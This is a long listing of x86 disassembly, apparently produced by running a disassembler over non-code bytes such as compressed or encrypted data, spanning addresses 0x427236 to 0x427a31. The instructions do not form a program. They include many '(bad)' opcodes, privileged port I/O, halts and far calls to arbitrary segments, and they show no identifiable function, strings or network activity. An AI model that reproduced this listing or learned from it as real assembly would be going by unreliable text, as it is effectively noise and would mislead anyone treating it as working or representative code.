  427236:	dec    edx
  427237:	sbb    eax,0x4998ec7c
  42723c:	hlt    
  42723d:	jl     0x427220
  42723f:	jbe    0x42722e
  427241:	add    dh,BYTE PTR [ecx+0x4b]
  427244:	jae    0x427248
  427246:	imul   ecx,DWORD PTR [edi+0x66ac86f0],0xd5e7c3
  427250:	add    BYTE PTR [eax],al
  427252:	add    BYTE PTR [eax],al
  427254:	mov    BYTE PTR [edi-0x5],dh
  427257:	bound  ebx,QWORD PTR [esi+0x7380d77d]
  42725d:	mov    edx,0x827be953
  427262:	out    0x96,eax
  427264:	neg    esp
  427266:	imul   ecx
  427268:	cmp    BYTE PTR [ebp-0x7e3f1606],bh
  42726e:	mov    edi,0x277e9
  427273:	ins    BYTE PTR es:[edi],dx
  427274:	sub    al,0xf8
  427276:	pop    es
  427277:	push   0xfb773c
  42727c:	mov    bl,0x74
  42727e:	ja     0x427289
  427280:	div    esp
  427282:	idiv   bh
  427284:	arpl   WORD PTR [esp+eax*2-0x73ae7201],di
  42728b:	jne    0x427261
  42728d:	in     eax,0x3b
  42728f:	xor    eax,0xc083fe9c
  427294:	push   0x8875f731
  427299:	mov    DWORD PTR [ebp+0x10],edx
  42729c:	repz push 0x7
  42729f:	mov    ebx,DWORD PTR [ecx-0xb347d12]
  4272a5:	push   ebp
  4272a6:	bnd call ebx
  4272a9:	jnp    0x42729b
  4272ab:	adc    edx,0xdc06fb6c
  4272b1:	jns    0x4272cf
  4272b3:	and    BYTE PTR [ecx],0xef
  4272b6:	push   DWORD PTR [ebx+0x0]
  4272b9:	add    BYTE PTR [eax],al
  4272bb:	add    BYTE PTR [eax],al
  4272bd:	jmp    0xa53ae7b1
  4272c2:	jl     0x4272f9
  4272c4:	add    BYTE PTR [ebx+edi*2],bl
  4272c7:	mov    esi,0xb9bd075e
  4272cc:	adc    BYTE PTR [eax+esi*4],cl
  4272cf:	jb     0x4272d1
  4272d1:	or     eax,DWORD PTR [esi-0x766161d]
  4272d7:	je     0x4272be
  4272d9:	xchg   edi,eax
  4272da:	dec    ecx
  4272db:	repz mov esp,ecx
  4272de:	std    
  4272df:	mov    BYTE PTR [ecx],al
  4272e1:	mov    edi,0x61e3e2c5
  4272e6:	cmp    bl,BYTE PTR [edi]
  4272e8:	adc    BYTE PTR [edi+ebp*8],cl
  4272eb:	jae    0x427311
  4272ed:	mov    esp,0xdc2473ee
  4272f2:	out    dx,al
  4272f3:	jae    0x427319
  4272f5:	int3   
  4272f6:	fnstsw WORD PTR [esi]
  4272f8:	push   DWORD PTR [ebp+0x58]
  4272fb:	jl     0x4272bc
  4272fd:	sub    ah,ah
  4272ff:	push   0x7f
  427301:	leave  
  427302:	ja     0x42728c
  427304:	push   ecx
  427305:	jge    0x427313
  427307:	mov    DWORD PTR [ecx],ebx
  427309:	inc    ebx
  42730a:	adc    BYTE PTR [ecx-0x3c068d08],cl
  427310:	aaa    
  427311:	out    dx,al
  427312:	adc    BYTE PTR [eax],bh
  427314:	daa    
  427315:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427316:	pusha  
  427317:	lods   al,BYTE PTR ds:[esi]
  427318:	sar    BYTE PTR [edx-0x38],1
  42731b:	aas    
  42731c:	daa    
  42731d:	xchg   edx,esp
  42731f:	icebp  
  427320:	sti    
  427321:	add    BYTE PTR [eax],al
  427323:	add    BYTE PTR [eax],al
  427325:	add    dh,ch
  427327:	push   0x3
  427329:	mov    eax,ebp
  42732b:	test   DWORD PTR [ebx],0xafe2ab
  427331:	lock jbe 0x4273ac
  427334:	pop    ss
  427335:	sbb    al,0x73
  427338:	dec    DWORD PTR [eax+0x7f2e3a8]
  42733e:	(bad)  
  42733f:	lahf   
  427340:	pop    ds
  427341:	mov    DWORD PTR [eax-0x13fd979d],edi
  427347:	lods   eax,DWORD PTR ds:[esi]
  427348:	pop    es
  427349:	xchg   DWORD PTR [edx+0x795988fb],ebp
  42734f:	add    al,0xdb
  427351:	repz jb 0x427344
  427354:	(bad)  [ebx]
  427356:	jbe    0x42739e
  427358:	pop    es
  427359:	sti    
  42735a:	push   0x75400f27
  42735f:	in     eax,0xc3
  427361:	aaa    
  427362:	inc    ecx
  427363:	pop    edx
  427364:	repnz push ds
  427366:	out    dx,al
  427367:	popf   
  427368:	pop    es
  427369:	out    0x8d,eax
  42736b:	hlt    
  42736c:	leave  
  42736d:	idiv   eax
  42736f:	mov    dh,0x7
  427371:	out    0x7b,eax
  427373:	in     eax,0x6
  427375:	mov    BYTE PTR [ebx+0x2],ch
  427378:	sub    eax,esp
  42737a:	mov    ecx,DWORD PTR [ecx+0x57]
  42737d:	jb     0x427349
  42737f:	cmc    
  427380:	aam    0x7
  427382:	cmp    BYTE PTR [esi+0xe],ch
  427385:	inc    edi
  427386:	dec    ebx
  427387:	data16 into 
  427389:	rol    BYTE PTR [eax],1
  42738b:	add    BYTE PTR [eax],al
  42738d:	add    BYTE PTR [eax],al
  42738f:	outs   dx,BYTE PTR ds:[esi]
  427390:	add    al,0x34
  427392:	sub    al,0xf2
  427394:	(bad)  
  427395:	loopne 0x427405
  427397:	cmp    BYTE PTR [ebp+0x1c],0x7c
  42739b:	call   0xf97d:0x17088e48
  4273a2:	loope  0x4273a1
  4273a4:	pop    ss
  4273a5:	inc    dx
  4273a7:	add    DWORD PTR [ebx+0x434206a9],0xfffffff7
  4273ae:	jae    0x427422
  4273b0:	idiv   DWORD PTR [edi+eax*1-0x50]
  4273b4:	outs   dx,BYTE PTR ds:[esi]
  4273b5:	scas   al,BYTE PTR es:[edi]
  4273b6:	inc    esi
  4273b7:	ror    DWORD PTR [edi+0x7e],cl
  4273ba:	sub    al,0x99
  4273bc:	push   es
  4273bd:	fcomp  QWORD PTR [edi]
  4273bf:	cli    
  4273c0:	(bad)
  4273c3:	bound  edi,QWORD PTR [ebx-0x5c]
  4273c6:	jnp    0x42740a
  4273c8:	dec    eax
  4273c9:	ds push cs
  4273cb:	repnz adc dh,BYTE PTR [eax+0x12]
  4273cf:	mov    dl,0x48
  4273d1:	in     eax,0x86
  4273d3:	xor    eax,0x9344ee07
  4273d8:	je     0x4273c0
  4273da:	lock push ds
  4273dc:	add    al,0xac
  4273de:	ja     0x42742a
  4273e0:	inc    ebx
  4273e1:	xchg   edi,eax
  4273e2:	fs scas al,BYTE PTR es:[edi]
  4273e4:	shr    BYTE PTR [ebp-0x16f93cb4],1
  4273ea:	shl    bl,1
  4273ec:	pop    esi
  4273ed:	push   0xe9031568
  4273f2:	add    eax,DWORD PTR [eax]
  4273f4:	add    BYTE PTR [eax],al
  4273f6:	add    BYTE PTR [eax],al
  4273f8:	cmp    bl,al
  4273fa:	call   FWORD PTR [ebp+0x620bf55f]
  427400:	pop    ecx
  427401:	pop    edx
  427402:	sub    esp,DWORD PTR [eax+0x79]
  427405:	add    cl,BYTE PTR [ebx]
  427407:	xchg   esi,eax
  427408:	ss jns 0x427450
  42740b:	fisttp QWORD PTR [esi]
  42740d:	add    dh,BYTE PTR [esi+eiz*8+0x6]
  427411:	add    ch,cl
  427413:	or     eax,0xfa00027a
  427418:	dec    ebx
  427419:	in     al,0x36
  42741b:	stos   BYTE PTR es:[edi],al
  42741c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42741d:	add    eax,0x702524c3
  427422:	sti    
  427423:	jmp    0x9587fb9e
  427428:	dec    esi
  427429:	int    0xf
  42742b:	sbb    eax,0x14fe9a6e
  427430:	push   0x25
  427432:	std    
  427433:	xchg   BYTE PTR [esi+0x2],dh
  427436:	jg     0x4273e9
  427438:	jle    0x4274b3
  42743a:	inc    ebp
  42743b:	jge    0x42742a
  42743d:	test   BYTE PTR [eax+0x6e],ah
  427440:	fild   QWORD PTR [ebx+0x50]
  427443:	inc    bp
  427445:	sti    
  427446:	mov    BYTE PTR [edx+edx*8-0xea6a287],bh
  42744d:	int3   
  42744e:	out    0x60,eax
  427450:	sbb    eax,0x166cc363
  427455:	ins    BYTE PTR es:[edi],dx
  427456:	sti    
  427457:	bound  eax,QWORD PTR ds:[edx]
  42745a:	add    cl,ch
  42745c:	add    BYTE PTR [eax],al
  42745e:	add    BYTE PTR [eax],al
  427460:	add    BYTE PTR [edi+0x36daf415],bl
  427466:	outs   dx,DWORD PTR ds:[esi]
  427467:	test   BYTE PTR [ecx],ch
  427469:	add    eax,0x99292e04
  42746e:	cmp    al,0xfe
  427470:	call   0xed77fbeb
  427475:	push   0xffffffc2
  427477:	(bad)  
  427478:	call   DWORD PTR [ebx]
  42747a:	jp     0x427401
  42747c:	fs jmp 0x427467
  42747f:	not    BYTE PTR [eax+0x59]
  427482:	inc    edx
  427483:	mov    edi,0x84d1cb50
  427488:	ror    bl,0x7f
  42748b:	mov    edx,0x31f08188
  427490:	shl    DWORD PTR [eax],cl
  427492:	and    eax,0x7dd04f83
  427497:	test   DWORD PTR [eax-0x45],ebp
  42749a:	call   0x771fb095
  42749f:	add    al,0x2b
  4274a1:	int    0x7a
  4274a3:	inc    ebp
  4274a4:	lock pop ss
  4274a6:	stc    
  4274a7:	add    BYTE PTR [ebp-0x91680],0x97
  4274ae:	ret    
  4274af:	jl     0x4274b6
  4274b1:	mov    bh,0xc3
  4274b3:	mov    BYTE PTR [ebp-0x8],al
  4274b6:	jl     0x4274fd
  4274b8:	hlt    
  4274b9:	(bad)  
  4274bb:	stc    
  4274bc:	mov    BYTE PTR [ecx-0x1cb38b56],dl
  4274c2:	lods   eax,DWORD PTR ds:[esi]
  4274c3:	jg     0x4274c5
  4274c5:	add    BYTE PTR [eax],al
  4274c7:	add    BYTE PTR [eax],al
  4274c9:	add    BYTE PTR [edx+eax*1+0x20],cl
  4274cd:	je     0x427530
  4274cf:	jp     0x42752e
  4274d1:	adc    esp,DWORD PTR [edi-0x2e72b1bf]
  4274d7:	jb     0x4274cf
  4274d9:	jmp    FWORD PTR [ebx-0x6fba73aa]
  4274df:	push   esi
  4274e0:	not    dh
  4274e2:	xchg   ecx,eax
  4274e3:	mov    BYTE PTR [esi],0x95
  4274e6:	rcl    DWORD PTR [esi],1
  4274e8:	cmp    BYTE PTR [ebp+0x3f],bl
  4274eb:	pop    esi
  4274ec:	and    ecx,DWORD PTR [ebx-0x7a7d9235]
  4274f2:	aam    0xea
  4274f4:	idiv   bh
  4274f6:	jne    0x427548
  4274f8:	ds jge 0x42756b
  4274fb:	inc    eax
  4274fc:	mov    DWORD PTR ds:[eax],edi
  4274ff:	dec    DWORD PTR [ebx+ecx*1-0x5101902]
  427506:	loop   0x42757c
  427508:	cmp    al,0xc1
  42750a:	pop    eax
  42750b:	popa   
  42750c:	sub    al,0xc1
  42750e:	cld    
  42750f:	push   ds
  427510:	ins    BYTE PTR es:[edi],dx
  427511:	out    0x76,eax
  427513:	repz leave 
  427515:	push   cs
  427516:	jge    0x42754e
  427518:	jp     0x42758f
  42751a:	ins    BYTE PTR es:[edi],dx
  42751b:	adc    edx,ebx
  42751d:	push   cs
  42751e:	sbb    bh,0x76
  427521:	cli    
  427522:	stos   BYTE PTR es:[edi],al
  427523:	lods   al,BYTE PTR ds:[esi]
  427524:	aam    0xfa
  427526:	mov    BYTE PTR [ebx+0xa],ah
  427529:	inc    eax
  42752a:	jne    0x42750c
  42752c:	jbe    0x427565
  42752e:	add    BYTE PTR [eax],al
  427530:	add    BYTE PTR [eax],al
  427532:	add    BYTE PTR [esi-0x75c2848c],cl
  427538:	mov    WORD PTR [eax+0x53],?
  42753b:	sub    BYTE PTR [esi+0x43],0x10
  42753f:	xor    eax,0xfe4ed05b
  427544:	jmp    0xffbf:0x56851577
  42754b:	lahf   
  42754c:	call   0xdcd3f958
  427551:	ja     0x42754e
  427553:	(bad)  
  427554:	gs pop es
  427556:	sti    
  427557:	ret    0xd16f
  42755a:	cli    
  42755b:	push   0x75400f8b
  427560:	loop   0x42751b
  427562:	mov    edi,0xbea186e
  427567:	ret    
  427568:	sub    al,0xa
  42756a:	rol    BYTE PTR [ebp+0x71e8ff9b],0x1c
  427571:	js     0x42756e
  427573:	cmp    eax,DWORD PTR [edx]
  427575:	lods   al,BYTE PTR ds:[esi]
  427576:	jl     0x4275ec
  427578:	in     al,0xdf
  42757a:	(bad)  
  42757b:	mov    esi,0x75f26cfc
  427580:	add    ch,cl
  427582:	mov    WORD PTR [eax],?
  427584:	(bad)  
  427585:	outs   dx,DWORD PTR ds:[esi]
  427586:	mov    esi,0x57a4790a
  42758b:	call   0x60a6:0x608a1cc7
  427592:	mov    esi,0x642c7922
  427597:	add    BYTE PTR [eax],al
  427599:	add    BYTE PTR [eax],al
  42759b:	add    BYTE PTR [edx+0x383fc0c7],dl
  4275a1:	stos   BYTE PTR es:[edi],al
  4275a2:	call   0x6044eaaa
  4275a7:	shl    esi,0x7e
  4275aa:	sub    al,0x98
  4275ac:	inc    ebp
  4275ad:	ins    DWORD PTR es:[edi],dx
  4275ae:	hlt    
  4275af:	pop    ss
  4275b0:	rol    eax,0xe8
  4275b3:	mov    WORD PTR [eax],?
  4275b5:	call   0xf7fc:0x6cded960
  4275bc:	gs ret 0x83e8
  4275c0:	add    BYTE PTR [eax-0x18],ch
  4275c3:	mov    bh,BYTE PTR [eax]
  4275c5:	pop    edx
  4275c6:	cmc    
  4275c7:	ret    
  4275c8:	jb     0x4275c1
  4275ca:	add    ecx,DWORD PTR [ecx-0x76e6b950]
  4275d0:	mov    eax,0x80771956
  4275d5:	adc    dl,ch
  4275d7:	ret    
  4275d8:	push   edx
  4275d9:	xchg   DWORD PTR [ecx],ebp
  4275db:	icebp  
  4275dc:	rcl    esp,cl
  4275de:	pop    ecx
  4275df:	adc    DWORD PTR ds:0xec03a913,esp
  4275e5:	lds    edx,FWORD PTR [ebp+edi*1-0x30]
  4275e9:	pop    esi
  4275ea:	mov    esp,0x38cd6c00
  4275ef:	lock ins BYTE PTR es:[edi],dx
  4275f1:	iret   
  4275f2:	push   DWORD PTR ds:0xb4fb5c24
  4275f8:	call   0x4012:0xdafcfad0
  4275ff:	jmp    0x427604
  427604:	add    bh,ch
  427606:	lds    eax,FWORD PTR [edi]
  427608:	mov    edx,0x1c3bded
  42760d:	(bad)  
  42760e:	ins    DWORD PTR es:[edi],dx
  42760f:	sti    
  427610:	push   es
  427611:	(bad)  
  427612:	in     eax,0x0
  427614:	xchg   ecx,eax
  427615:	cmc    
  427616:	add    al,BYTE PTR [eax]
  427618:	jmp    0x614e6b80
  42761d:	lods   al,BYTE PTR ds:[esi]
  42761e:	xchg   ebx,edi
  427620:	mov    esi,0x549bcd8e
  427625:	push   0xc93efde4
  42762a:	adc    bh,bh
  42762c:	call   0xf5b7dda7
  427631:	and    edx,DWORD PTR ds:0x6bb6d508
  427637:	xchg   BYTE PTR [ecx+ebp*2],ch
  42763a:	in     al,0x0
  42763c:	pop    esp
  42763d:	mov    ebp,0x28ee83f
  427642:	addr16 sti 
  427644:	sahf   
  427645:	test   DWORD PTR [edi+0x52],ebp
  427648:	xchg   esi,eax
  427649:	gs push esi
  42764b:	adc    BYTE PTR [ecx],ch
  42764d:	jns    0x4275d1
  42764f:	jge    0x42762b
  427651:	jno    0x42764a
  427653:	test   BYTE PTR [esi+0x76],dl
  427656:	add    al,BYTE PTR [eax]
  427658:	mov    al,0x3d
  42765a:	arpl   WORD PTR [ebp-0x1f],si
  42765d:	dec    ah
  42765f:	push   cs
  427660:	and    BYTE PTR [edi+ebx*2],ch
  427663:	je     0x42764a
  427665:	add    ch,0xe
  427668:	call   0x42766d
  42766d:	add    BYTE PTR [eax],ch
  42766f:	push   0xc2863915
  427674:	(bad)  
  427675:	jmp    DWORD PTR [ebp+0x138ef42]
  42767b:	adc    BYTE PTR [esi+ecx*1-0x1],dh
  42767f:	repz je 0x427666
  427682:	arpl   WORD PTR [edx-0x1d],si
  427685:	push   esi
  427686:	push   ebx
  427687:	adc    dh,BYTE PTR [eax+edx*1+0x4582fecc]
  42768e:	adc    al,0x50
  427690:	mov    WORD PTR [ebp-0x58],cs
  427693:	xlat   BYTE PTR ds:[ebx]
  427694:	cwde   
  427695:	cld    
  427696:	jae    0x42768c
  427698:	dec    edx
  427699:	push   esi
  42769a:	push   es
  42769b:	sti    
  42769c:	div    BYTE PTR [ebp-0x30]
  42769f:	repz into 
  4276a1:	dec    DWORD PTR [ecx-0x25]
  4276a4:	out    dx,al
  4276a5:	fdiv   DWORD PTR [edi-0x3a]
  4276a8:	aas    
  4276a9:	push   esi
  4276aa:	inc    ebp
  4276ab:	stos   DWORD PTR es:[edi],eax
  4276ac:	mov    bl,0xff
  4276ae:	mov    ecx,0x9c400fba
  4276b3:	es pop ebp
  4276b5:	adc    ebp,DWORD PTR [eax+0x4]
  4276b8:	dec    ebx
  4276b9:	jmp    FWORD PTR [ecx-0x1e]
  4276bc:	div    BYTE PTR [ebp-0x4c]
  4276bf:	cmp    esi,esi
  4276c1:	adc    eax,0x401608
  4276c6:	dec    edi
  4276c7:	push   ecx
  4276c8:	pavgw  mm3,QWORD PTR gs:[edx+0x7]
  4276cd:	mov    BYTE PTR [ecx-0x76],al
  4276d0:	not    edi
  4276d2:	add    BYTE PTR [eax],al
  4276d4:	add    BYTE PTR [eax],al
  4276d6:	add    BYTE PTR [ecx+edx*2-0x69],al
  4276da:	jne    0x427729
  4276dc:	pop    esp
  4276dd:	call   DWORD PTR [ebp-0x7c]
  4276e0:	idiv   edx
  4276e2:	dec    DWORD PTR [edi+ebp*8+0x74]
  4276e6:	or     al,0xe3
  4276e8:	stc    
  4276e9:	pop    es
  4276ea:	adc    al,0x1c
  4276ec:	push   es
  4276ed:	add    DWORD PTR [ebp+0x44],0x5c
  4276f1:	add    BYTE PTR [ebp-0x17b4618b],cl
  4276f7:	jno    0x4276b0
  4276f9:	je     0x4276f6
  4276fb:	mov    al,0x2a
  4276fe:	sbb    al,0x41
  427700:	popf   
  427701:	(bad)  
  427702:	cli    
  427703:	sub    BYTE PTR [edi-0x3b8abff2],0xb9
  42770a:	icebp  
  42770b:	mov    al,0x7
  42770d:	add    BYTE PTR [esi+ebx*4+0x62],dh
  427711:	shr    bl,cl
  427713:	adc    BYTE PTR [esi+0x36],0x5d
  427717:	in     eax,0x8f
  427719:	add    eax,0x6ee6ea4f
  42771e:	sti    
  42771f:	push   0x80fac9f7
  427724:	daa    
  427725:	adc    al,0x40
  427727:	jne    0x4276b5
  427729:	or     BYTE PTR [ebp-0x4f],0xf4
  42772d:	cmp    ebp,eax
  42772f:	jns    0x427778
  427731:	je     0x42772e
  427733:	dec    edi
  427734:	popa   
  427735:	int    0x67
  427737:	mov    bl,BYTE PTR [edi+edi*8-0x1]
  42773b:	add    BYTE PTR [eax],al
  42773d:	add    BYTE PTR [eax],al
  42773f:	add    BYTE PTR [edx-0x7704f7da],ch
  427745:	jae    0x427752
  427747:	inc    eax
  427748:	jne    0x42770f
  42774a:	dec    BYTE PTR [eax+eax*2-0x623c7761]
  427751:	js     0x4277cb
  427753:	sti    
  427754:	or     BYTE PTR [eax-0x6fdc4016],0xa
  42775b:	mov    al,0x85
  42775d:	sbb    eax,DWORD PTR [edx+edx*2]
  427760:	push   0x46
  427762:	aas    
  427763:	adc    BYTE PTR [ebp+0x5e45895b],dh
  427769:	adc    dl,dl
  42776b:	push   esi
  42776c:	cmp    al,0x9d
  42776e:	add    eax,DWORD PTR [eax]
  427770:	inc    ebx
  427771:	add    ch,BYTE PTR [edi+ebp*2+0x3a39ee6d]
  427778:	cwde   
  427779:	push   esi
  42777a:	fdiv   st(6),st
  42777c:	ins    DWORD PTR es:[edi],dx
  42777d:	(bad)  
  42777e:	pop    eax
  42777f:	out    dx,eax
  427780:	jl     0x427757
  427782:	inc    ecx
  427783:	out    dx,al
  427784:	adc    ch,BYTE PTR [ecx-0x4c]
  427787:	addr16 (bad) 
  427789:	imul   ebx,esp,0xe8c265af
  42778f:	sar    cl,1
  427791:	mov    dh,0x2c
  427793:	mov    BYTE PTR [esi],dh
  427795:	pop    edx
  427796:	inc    esi
  427797:	js     0x427797
  427799:	push   0xeeefcdb6
  42779e:	fdiv   QWORD PTR [eax+eax*4-0xa]
  4277a2:	fadd   st(3),st
  4277a4:	add    BYTE PTR [eax],al
  4277a6:	add    BYTE PTR [eax],al
  4277a8:	add    dl,ah
  4277aa:	jge    0x4277d5
  4277ac:	out    dx,al
  4277ad:	adc    eax,0xda78947a
  4277b2:	cdq    
  4277b3:	repz std 
  4277b5:	push   0x48
  4277b7:	es add al,0x79
  4277ba:	aad    0x6d
  4277bc:	rcl    BYTE PTR [esi-0x424c506],1
  4277c2:	in     eax,0x4
  4277c4:	sbb    BYTE PTR [ecx],ah
  4277c6:	mov    eax,0x20b6ed0
  4277cb:	jmp    0x2c302d57
  4277d0:	mov    DWORD PTR [esi+0x407327ed],ecx
  4277d6:	push   es
  4277d7:	(bad)
  4277da:	addr16 hlt 
  4277dc:	jmp    0x427843
  4277de:	ret    0x7ee8
  4277e1:	gs jle 0x427777
  4277e4:	clc    
  4277e5:	lahf   
  4277e6:	sub    esp,DWORD PTR [ebx]
  4277e8:	or     al,ch
  4277ea:	sbb    al,0xf
  4277ec:	(bad)  
  4277ed:	(bad)  
  4277ee:	pop    edx
  4277ef:	add    BYTE PTR [ecx-0x78],dl
  4277f2:	add    al,BYTE PTR [eax]
  4277f4:	bound  edi,QWORD PTR [edi]
  4277f6:	add    BYTE PTR [ecx+0x1bc4c3ee],cl
  4277fc:	jo     0x42782c
  4277fe:	add    al,0x66
  427800:	stc    
  427801:	cmc    
  427802:	les    ecx,FWORD PTR [ebx]
  427804:	mov    ecx,0x9e0843f3
  427809:	mov    esi,0xe9303d
  42780e:	add    BYTE PTR [eax],al
  427810:	add    BYTE PTR [eax],al
  427812:	jbe    0x427893
  427814:	inc    edx
  427815:	loope  0x4277d3
  427817:	add    al,0x1
  427819:	inc    edx
  42781a:	or     ebp,edx
  42781c:	dec    esi
  42781d:	es pop esp
  42781f:	push   ds
  427820:	adc    al,0xa9
  427822:	jbe    0x4277ef
  427824:	pop    ecx
  427825:	mov    dl,0x38
  427827:	cli    
  427828:	call   DWORD PTR [esi]
  42782a:	jl     0x42784e
  42782c:	fisubr DWORD PTR [edx+0x7251fe76]
  427832:	frstor [ebx]
  427834:	or     BYTE PTR [ebp-0x65],bh
  427837:	pop    edx
  427838:	nop
  427839:	push   ebx
  42783a:	jno    0x42783e
  42783c:	test   BYTE PTR [ecx+0x14fb0dca],ch
  427842:	gs inc esi
  427844:	aas    
  427845:	jmp    0xf8ba8571
  42784a:	mov    dh,0x67
  42784c:	test   BYTE PTR [ecx+0x3936fdaa],ch
  427852:	ins    DWORD PTR es:[edi],dx
  427853:	in     eax,dx
  427854:	add    al,0xfa
  427856:	ss ret 0xe2e6
  42785a:	pop    es
  42785b:	out    dx,al
  42785c:	and    esi,ebp
  42785e:	pushf  
  42785f:	ins    BYTE PTR es:[edi],dx
  427860:	adc    eax,0xffc262e1
  427865:	ss mov ebx,0xea33fffa
  42786b:	push   esi
  42786c:	repnz add BYTE PTR [ecx+0x23],dl
  427870:	(bad)  
  427871:	inc    ebx
  427872:	dec    esp
  427873:	dec    DWORD PTR [ebp+0x57]
  427876:	add    BYTE PTR [eax],al
  427878:	add    BYTE PTR [eax],al
  42787a:	add    bh,dl
  42787c:	jb     0x427881
  42787e:	je     0x427883
  427880:	retf   
  427881:	dec    esp
  427882:	call   0x2120:0xc084034c
  427889:	div    DWORD PTR ds:0x3ab728
  42788f:	mov    ebx,0xcc11780a
  427894:	add    al,BYTE PTR [ebx+0x73e991f0]
  42789a:	sbb    al,0x7
  42789c:	jno    0x42789d
  42789e:	je     0x4278c3
  4278a0:	jmp    0x6f8e88e9
  4278a5:	or     bh,bh
  4278a7:	loope  0x42790f
  4278a9:	not    BYTE PTR ds:0x4013a8
  4278af:	push   edi
  4278b0:	cmp    DWORD PTR [ebx],eax
  4278b2:	(bad)  
  4278b3:	sar    ch,cl
  4278b5:	loop   0x4278c4
  4278b7:	fld    TBYTE PTR [esi+0xb]
  4278ba:	call   DWORD PTR [ecx+0x67]
  4278bd:	dec    esi
  4278be:	jmp    DWORD PTR [ecx-0x33bfec06]
  4278c4:	push   ecx
  4278c5:	pop    ecx
  4278c6:	pop    ebp
  4278c7:	push   cs
  4278c8:	add    al,BYTE PTR [eax]
  4278ca:	mul    BYTE PTR [ecx-0x63bc29de]
  4278d0:	dec    BYTE PTR [ebp-0x75]
  4278d3:	pusha  
  4278d4:	sbb    cl,BYTE PTR [eax]
  4278d6:	je     0x42794a
  4278d8:	(bad)  
  4278d9:	hlt    
  4278da:	cdq    
  4278db:	pushf  
  4278dc:	add    al,BYTE PTR [eax+eax*8+0x0]
  4278e3:	add    BYTE PTR [eax-0x9],al
  4278e6:	div    BYTE PTR ds:0x3ad278
  4278ec:	fisttp DWORD PTR [esi]
  4278ee:	js     0x427901
  4278f0:	jne    0x42790d
  4278f2:	add    al,0x85
  4278f4:	xor    eax,0xe536fb10
  4278f9:	push   edi
  4278fa:	repnz pop es
  4278fc:	xor    ebx,DWORD PTR [esi+edi*8-0x7a]
  427900:	mov    ch,0x63
  427902:	pop    esp
  427903:	add    esp,DWORD PTR [ebx+0x680812d4]
  427909:	fwait
  42790a:	call   FWORD PTR [ecx+0x37]
  42790d:	pusha  
  42790e:	push   ecx
  427910:	js     0x42790d
  427912:	dec    ebp
  427913:	aas    
  427914:	jne    0x427975
  427916:	fld    DWORD PTR [esi+0x73fbf7a9]
  42791c:	push   ebx
  42791d:	shl    DWORD PTR [ebp-0x7ca48a67],cl
  427923:	rol    BYTE PTR [ecx+0x61357036],0xbf
  42792a:	(bad)  
  42792b:	(bad)  
  42792c:	sti    
  42792d:	outs   dx,BYTE PTR ds:[esi]
  42792e:	out    0x10,eax
  427930:	xor    eax,0x61c0825b
  427935:	inc    esi
  427936:	sub    al,0x70
  427938:	jns    0x427920
  42793a:	test   cl,0x75
  42793d:	pop    edx
  42793e:	jl     0x427980
  427940:	jge    0x427942
  427942:	or     DWORD PTR [edx-0x36],edx
  427945:	dec    esi
  427946:	das    
  427947:	adc    al,0x0
  427949:	add    BYTE PTR [eax],al
  42794b:	add    BYTE PTR [eax],al
  42794d:	xor    eax,0x71bdd15b
  427952:	pop    ebx
  427953:	jns    0x42795a
  427955:	push   ebp
  427956:	lods   eax,DWORD PTR ds:[esi]
  427957:	(bad)  
  427958:	push   DWORD PTR [esi+0x2d]
  42795b:	jge    0x4279d1
  42795d:	pop    ecx
  42795e:	outs   dx,DWORD PTR ds:[esi]
  42795f:	repz push ds
  427961:	lea    ebp,[edi+eax*4]
  427964:	add    BYTE PTR [ebp-0x29],dh
  427967:	ds je  0x4279d9
  42796a:	xchg   esp,eax
  42796b:	xor    bl,BYTE PTR [ecx+eiz*4]
  42796e:	add    ah,BYTE PTR [esi]
  427970:	add    al,0x7e
  427972:	mov    ebx,db2
  427975:	mov    ch,0x2
  427977:	ins    BYTE PTR es:[edi],dx
  427978:	inc    ebx
  427979:	loope  0x427973
  42797b:	int    0xf3
  42797d:	jp     0x42796e
  42797f:	jmp    0x4279b5
  427981:	xor    eax,0xa4fc8dc2
  427986:	gs std 
  427988:	daa    
  427989:	jns    0x4279f0
  42798b:	aam    0x13
  42798d:	push   0xf8d1e8c2
  427992:	stc    
  427993:	call   0x5b98756e
  427998:	push   es
  427999:	push   ebp
  42799a:	inc    esp
  42799b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42799c:	add    edi,DWORD PTR [ecx-0x2f]
  42799f:	ins    DWORD PTR es:[edi],dx
  4279a0:	into   
  4279a1:	jb     0x42796f
  4279a3:	mov    ah,0xe0
  4279a5:	sbb    ch,BYTE PTR [esi]
  4279a7:	push   eax
  4279a8:	add    esi,DWORD PTR [ebp+0x7e]
  4279ab:	sub    edi,esi
  4279ad:	xchg   esp,eax
  4279ae:	fmul   QWORD PTR gs:[edi]
  4279b1:	add    BYTE PTR [eax],al
  4279b3:	add    BYTE PTR [eax],al
  4279b5:	add    BYTE PTR [ecx],bl
  4279b7:	shr    eax,0x70
  4279ba:	mov    dl,ch
  4279bc:	test   ebx,0x861977ea
  4279c2:	out    0xed,eax
  4279c4:	pushf  
  4279c5:	sub    al,0x3f
  4279c7:	(bad)  
  4279c8:	jae    0x42798a
  4279ca:	push   ebx
  4279cb:	out    0xe4,eax
  4279cd:	add    eax,DWORD PTR [ecx-0xb]
  4279d0:	jle    0x4279e5
  4279d2:	lock mov ebx,0xbee9d3f4
  4279d8:	in     al,dx
  4279d9:	rcr    DWORD PTR [edx+0x75040211],cl
  4279df:	or     DWORD PTR [esp+edx*1+0x75],0x9fd713ee
  4279e7:	jmp    0x4279d9
  4279e9:	outs   dx,BYTE PTR ds:[esi]
  4279ea:	push   0xb6d90052
  4279ef:	fs imul ebp,ecx,0x7207f013
  4279f6:	or     esp,ebx
  4279f8:	adc    edi,DWORD PTR [edx]
  4279fa:	loop   0x427a09
  4279fc:	call   0xf2a6b0fe
  427a01:	mov    cl,0x6e
  427a03:	inc    edx
  427a04:	push   ebx
  427a05:	xchg   BYTE PTR [ebx-0x4],ah
  427a08:	aas    
  427a09:	jo     0x427a46
  427a0b:	or     bl,bh
  427a0d:	fsub   QWORD PTR [edx+0x33e94012]
  427a13:	adc    eax,0xbea9c0
  427a18:	out    0xec,eax
  427a1a:	add    BYTE PTR [eax],al
  427a1c:	add    BYTE PTR [eax],al
  427a1e:	add    BYTE PTR [ebx+0x2c560fed],ah
  427a24:	clc    
  427a25:	dec    esi
  427a26:	dec    esi
  427a27:	jl     0x427a4b
  427a29:	adc    al,0xa9
  427a2b:	jbe    0x4279f5
  427a2d:	push   esi
  427a2e:	pushf  
  427a2f:	mov    ah,0xf6
  427a31:	call   FWORD PTR [ebx-0x1b0da971]
